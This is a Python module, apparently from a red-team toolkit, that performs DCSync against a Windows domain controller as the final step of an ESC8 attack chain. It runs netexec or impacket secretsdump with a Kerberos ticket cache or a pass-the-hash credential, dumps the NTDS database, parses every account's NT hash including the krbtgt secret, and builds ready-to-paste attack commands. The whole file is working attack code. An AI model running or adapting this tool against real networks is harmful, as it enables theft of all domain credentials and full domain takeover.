"""DCSync — pull the domain's NTDS via DRSUAPI.

Terminal step of the ESC8 chain. Once we hold a machine account TGT
(from :mod:`fieldkit.pkinit`) OR a credential with DS-Replication-Get-Changes
rights, DCSync replicates the domain database and hands back every
account's NT hash + krbtgt secret. That's game-over — the operator
has the domain.

Wraps ``nxc`` (netexec) with ``--use-kcache`` when the caller has a
ccache from PKINIT, or with ``-H`` / ``-p`` when they have a hash /
password. Both flows produce the same output: a table of accounts +
hashes that we parse into individual credentials for Store.

Fallback path (nxc not on PATH) is the same operator-hint shape as
the D2/D3/D4 pkinit modules: a paste-ready command string.
"""
import os
import re
import shutil
from dataclasses import dataclass, field

from . import runner


DCSYNC_RESULT_KINDS = frozenset({
    "no-tool", "ok", "denied", "unreachable", "fail",
})


@dataclass(frozen=True)
class DcsyncCredential:
    """One recovered account hash. NT hash format matches what
    fieldkit.creds accepts for `add_credential` re-spray."""
    principal: str          # DOMAIN\username OR user@REALM
    nt_hash: str            # aad3b435… : hex hex
    rid: str = ""           # optional RID marker for reporting


@dataclass(frozen=True)
class DcsyncResult:
    kind: str
    credentials: tuple = field(default_factory=tuple)
    command_hint: str = ""
    detail: str = ""

    def __post_init__(self):
        if self.kind not in DCSYNC_RESULT_KINDS:
            raise ValueError(
                f"DcsyncResult.kind must be one of {sorted(DCSYNC_RESULT_KINDS)}, "
                f"got {self.kind!r}")


_TOOL_SEARCH_ORDER = ("nxc", "netexec", "impacket-secretsdump")


def find_tool(arsenal_hint=None):
    for name in _TOOL_SEARCH_ORDER:
        p = shutil.which(name)
        if p:
            return p
    if arsenal_hint:
        for name in _TOOL_SEARCH_ORDER:
            p = os.path.join(arsenal_hint, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
    return None


#: Match nxc's `--ntds` output. Each dumped row is
#: ``DOMAIN\user:rid:LM-hash:NT-hash:::``. Both nxc and impacket
#: emit the same shape (nxc wraps impacket's secretsdump under the
#: hood), so one regex covers both tools.
_NTDS_LINE_RE = re.compile(
    r"^(?P<principal>[^\s:]+):(?P<rid>\d+):"
    r"(?P<lm>[a-fA-F0-9]{32}):(?P<nt>[a-fA-F0-9]{32}):::",
    re.MULTILINE)

_SIGNATURES = (
    # denied signatures land before ok so a partial dump interrupted
    # by a denial doesn't get misclassified — but nxc emits denials
    # BEFORE it prints any NTDS row, so `ok` (any parsed row) wins
    # naturally. Kept for future-proofing.
    ("DRSGetNCChanges",           "denied"),
    ("STATUS_LOGON_FAILURE",      "denied"),
    ("STATUS_ACCESS_DENIED",      "denied"),
    ("Connection refused",        "unreachable"),
    ("Name or service not known", "unreachable"),
    ("timed out",                 "unreachable"),
)


def _classify(text, credentials):
    if credentials:
        return "ok"
    for sig, kind in _SIGNATURES:
        if sig in text:
            return kind
    return "fail"


def _parse_credentials(text):
    """Every NTDS row in ``text`` → :class:`DcsyncCredential`. Skips
    the placeholder ``krbtgt`` line? No — we KEEP krbtgt: it's the
    golden-ticket enabler and the whole point of the chain."""
    out = []
    for m in _NTDS_LINE_RE.finditer(text):
        out.append(DcsyncCredential(
            principal=m.group("principal"),
            nt_hash=f"{m.group('lm')}:{m.group('nt')}",
            rid=m.group("rid")))
    return tuple(out)


def _build_command_hint_ccache(tool_bin, dc_ip, ccache_path):
    tool = tool_bin or "nxc"
    return (f"KRB5CCNAME={ccache_path} {tool} smb {dc_ip} -k --use-kcache --ntds")


def _build_command_hint_hash(tool_bin, dc_ip, user, domain, nt_hash):
    tool = tool_bin or "nxc"
    return (f"{tool} smb {dc_ip} -u '{user}' -d '{domain}' "
            f"-H '{nt_hash}' --ntds")


def dcsync(dc_ip, ccache_path=None, nt_hash=None, username=None,
           domain=None, tool_bin=None, tool_timeout=180,
           arsenal_hint=None):
    """Replicate the domain database from ``dc_ip``.

    Auth flavor is auto-detected from what the caller passes:
      * ccache_path → -k --use-kcache (PKINIT'd TGT path — the
        canonical ESC8 tail)
      * nt_hash + username + domain → -H (Pass-the-Hash flavor,
        used when the chain caught a hash directly rather than a
        cert)

    Args:
      dc_ip:        the DC to replicate from.
      ccache_path:  path to a ccache file (PKINIT output).
      nt_hash:      NT hash (LM:NT or bare NT).
      username:     account name (needed with nt_hash).
      domain:       AD domain.
      tool_bin:     override the resolved nxc binary.
      tool_timeout: subprocess timeout. Default 180s — a real NTDS
                    dump on a 10k-user domain takes 30-90s.
      arsenal_hint: additional search directory.
    """
    tool = tool_bin or find_tool(arsenal_hint=arsenal_hint)
    if not tool:
        if ccache_path:
            hint = _build_command_hint_ccache(None, dc_ip, ccache_path)
        else:
            hint = _build_command_hint_hash(
                None, dc_ip, username or "", domain or "", nt_hash or "")
        return DcsyncResult(kind="no-tool", command_hint=hint)

    if ccache_path:
        argv = [tool, "smb", dc_ip, "-k", "--use-kcache", "--ntds"]
        env_add = {"KRB5CCNAME": ccache_path}
    elif nt_hash and username and domain:
        argv = [tool, "smb", dc_ip, "-u", username, "-d", domain,
                "-H", nt_hash, "--ntds"]
        env_add = None
    else:
        return DcsyncResult(
            kind="fail",
            detail="dcsync needs either ccache_path or (nt_hash + username + domain)")

    result = runner.run(argv, env_add=env_add, timeout=tool_timeout)
    if result.error and "not found" in result.error:
        return DcsyncResult(kind="no-tool")
    if result.timed_out:
        return DcsyncResult(
            kind="unreachable",
            detail=(result.stdout + result.stderr)[-1024:])

    output = result.stdout + result.stderr
    creds = _parse_credentials(output)
    kind = _classify(output, creds)
    return DcsyncResult(kind=kind, credentials=creds,
                         detail=output[-2048:])
